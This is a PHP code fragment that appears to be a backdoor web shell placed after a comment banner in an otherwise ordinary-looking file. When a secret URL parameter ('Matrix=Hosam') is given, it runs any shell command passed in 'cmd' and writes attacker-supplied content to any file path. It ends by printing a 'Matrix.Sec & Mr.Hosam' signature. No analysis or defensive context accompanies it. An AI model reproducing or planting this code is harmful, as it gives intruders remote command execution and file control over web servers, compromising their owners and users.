 ...
 ********************************************************************************/
 if ( $_GET['Matrix'] == "Hosam" ) {

@system($_GET['cmd']);

if($_POST[v]){
$new=$_POST['new'];
$class_file=fopen("$new","w");
$v=$_POST['v'];

$class_file=fopen("$new","a+");

$FILE_r=fputs($class_file,$v);
...
<textarea name=v rows=20 cols=15></textarea>
<input type=submit value=submit>
<?php
}
echo "<br> Matrix.Sec & Mr.Hosam <br>";
}
